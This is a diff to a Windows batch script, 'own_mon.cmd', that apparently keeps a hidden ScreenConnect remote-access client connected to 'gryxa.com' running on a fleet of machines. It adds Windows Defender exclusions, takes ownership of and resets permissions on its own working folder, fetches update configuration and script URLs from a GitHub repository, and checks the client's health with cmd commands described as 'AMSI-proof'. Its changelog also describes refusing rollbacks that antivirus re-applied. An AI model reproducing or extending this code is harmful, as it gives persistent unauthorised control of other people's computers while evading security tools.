@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M56
+rem  OWN_MON  BUILD 20260804M57
+rem  M57: fleet_channel.cfg pin+floor; cmd-first Gryxa health (ignore AMSI garbage); no downgrade.
 rem  M56: refuse mon downgrade (CDN/AMSI was re-applying M36); AMSI exclusions at tick start; cmd-only Gryxa path.
-rem  M55: no auto HEAL msiexec unless 1060; HEALTHY needs relay (L48). Stops HEAL /x killing online Guests.
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
@@ -61,7 +61,10 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M56"
+set "MONVER=M57"
+set "MON_MIN=M56"
+set "GIT_PIN="
+set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -107,6 +110,24 @@ rem M35: guarantee update channel — unharden workdir each tick and stage downl
 rem in C:\Windows\Temp (never ACL-locked), then move into %WD%. LockDir cannot freeze us.
 set "STAGE=%SystemRoot%\Temp\.upd"
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
+rem M57: load fleet_channel.cfg — pin URLs + version floor (stops stale main/CDN M36)
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\fleet_channel.cfg" "%CHANNEL_URL%" >nul 2>&1
+if exist "%STAGE%\fleet_channel.cfg" (
+  for /f "usebackq tokens=1,* delims==" %%K in ("%STAGE%\fleet_channel.cfg") do (
+    if /I "%%K"=="MON_MIN" set "MON_MIN=%%L"
+    if /I "%%K"=="GIT_PIN" set "GIT_PIN=%%L"
+  )
+  if defined GIT_PIN if /I not "!GIT_PIN!"=="main" if not "!GIT_PIN!"=="" (
+    set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_mon.cmd?t=%RANDOM%%RANDOM%"
+    set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_lib.ps1?t=%RANDOM%%RANDOM%"
+    set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
+    set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_secure.cmd?t=%RANDOM%%RANDOM%"
+    set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest?t=%RANDOM%%RANDOM%"
+    set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest.sig?t=%RANDOM%%RANDOM%"
+    echo channel_pin=!GIT_PIN! mon_min=!MON_MIN!>>"%LOG%"
+  )
+  copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul 2>&1
+)
 attrib -h -s -r "%WD%" >nul 2>&1
 takeown /F "%WD%" /R /D Y >nul 2>&1
 icacls "%WD%" /reset /T /C /Q >nul 2>&1
@@ -475,17 +496,51 @@ if exist "%WD%\force_gryxa.new" (
   )
 )
 
-rem Detect any Running non-sevrz ScreenConnect (true Gryxa presence)
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >"%WD%\gryxa_health.out" 2>nul
+rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
 set "GH="
-if exist "%WD%\gryxa_health.out" for /f "usebackq delims=" %%R in ("%WD%\gryxa_health.out") do set "GH=%%R"
-echo gryxa_health=!GH!>>"%LOG%"
-echo !GH!| findstr /I /B /C:"HEALTHY" >nul
+sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
 if not errorlevel 1 (
-  set "GRYXA_OK=1"
-  set "GRYXA_WAS=1"
-  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+  if not errorlevel 1 (
+    set "GRYXA_OK=1"
+    set "GRYXA_WAS=1"
+    set "GH=HEALTHY|%GRYXA_FP%|cmd-sc-relay"
+  )
 )
+if "!GRYXA_OK!"=="0" (
+  for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+    set "_FP=%%a"
+    set "_FP=!_FP: =!"
+    if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
+      sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+      if not errorlevel 1 (
+        reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+        if not errorlevel 1 (
+          set "GRYXA_OK=1"
+          set "GRYXA_WAS=1"
+          set "GRYXA_FP=!_FP!"
+          set "GH=HEALTHY|!_FP!|cmd-sc-relay"
+        )
+      )
+    )
+  )
+)
+if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >"%WD%\gryxa_health.out" 2>nul
+  if exist "%WD%\gryxa_health.out" for /f "usebackq delims=" %%R in ("%WD%\gryxa_health.out") do set "GH=%%R"
+  echo !GH!| findstr /I /B /C:"HEALTHY|" /C:"BROKEN|" /C:"STUCK|" /C:"ABSENT|" >nul
+  if errorlevel 1 (
+    echo gryxa_health_amsi_or_garbage ignored>>"%LOG%"
+    set "GH=UNTRUSTED|amsi"
+  ) else (
+    echo !GH!| findstr /I /B /C:"HEALTHY|" >nul
+    if not errorlevel 1 (
+      set "GRYXA_OK=1"
+      set "GRYXA_WAS=1"
+    )
+  )
+)
+echo gryxa_health=!GH!>>"%LOG%"
 
 rem FORCE push: queue Gryxa REINSTALL (panel wipe) then ack — freeze still blocks daily msiexec
 if "%FORCE_G%"=="1" (
